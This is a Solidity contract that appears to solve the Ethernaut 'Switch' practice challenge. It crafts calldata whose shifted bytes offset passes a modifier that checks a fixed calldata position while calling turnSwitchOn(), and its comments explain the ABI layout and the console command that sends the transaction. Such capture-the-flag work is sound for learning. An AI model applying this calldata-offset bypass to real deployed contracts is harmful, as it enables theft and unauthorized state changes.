// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {

    function pwn() public pure returns (bytes memory){
        // turnSwitchOff() signature = 0x20606e15
        // abi.encodeWithSignature("turnSwitchOff()");
        // 
        // ABI explanation:
        // 30c13ade is the function selector for flipSwitch(bytes).
        // 00: Since bytes is a dynamic type, it can consume any number of 32-byte segments. To avoid spilling over and colliding with other arguments passed into this function, this slot is actually a pointer to the calldata slot where the concrete bytes value can be found. Here, the ABI is saying to go to slot 20 to find the actual bytes value.
        // 20: This is the beginning of the actual bytes value. Since bytes is also a variable-length type, this slot indicates the length of the actual bytes. In this case, it's saying the value is 4 bytes large.
        // 40: Finally, here are the bytes we passed into the function! From the previous slot, the program knows to only pull in the first 4 bytes from this slot and return that for _data. In this case, the program sets _data to 20606e15.
        //
        // 0x
        // 30c13ade <-- function selector
        // 00: 0000000000000000000000000000000000000000000000000000000000000020 <-- offset
        // 20: 0000000000000000000000000000000000000000000000000000000000000004 <-- length
        // 40: 20606e1500000000000000000000000000000000000000000000000000000000 <-- data
        //
        // calldatacopy(selector, 68, 4), offset 68 bytes and grab the next 4 bytes
        // = 20606e15
        // abi.encodeWithSignature("flipSwitch(bytes)", signature);
        //
        // turnSwitchOn() signature = 0x76227e12
        // abi.encodeWithSignature("turnSwitchOn()");
        //
        // we can bypass onlyOff() modifier require(selector[0] == offSelector) by passing custom data
        //
        // constructing the data
        // 0x
        // 30c13ade <-- flipSwitch(bytes) function selector
        // 00: 0000000000000000000000000000000000000000000000000000000000000060 <-- offset by 96 bytes
        // 20: 0000000000000000000000000000000000000000000000000000000000000000 <-- empty passing
        // 40: 20606e1500000000000000000000000000000000000000000000000000000000 <-- turnSwitchOff() signature for onlyOff() require statement
        // 60: 0000000000000000000000000000000000000000000000000000000000000004 <-- length
        // 80: 76227e1200000000000000000000000000000000000000000000000000000000 <-- turnSwitchOn() signature
        // hex literal of the data
        bytes memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"; 
        
        return data;
        // take this {data} and send the transaction in Ethernaut console
        // const data = '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000';
        // await sendTransaction({from: player, to: contract.address, data: data});
    }
}
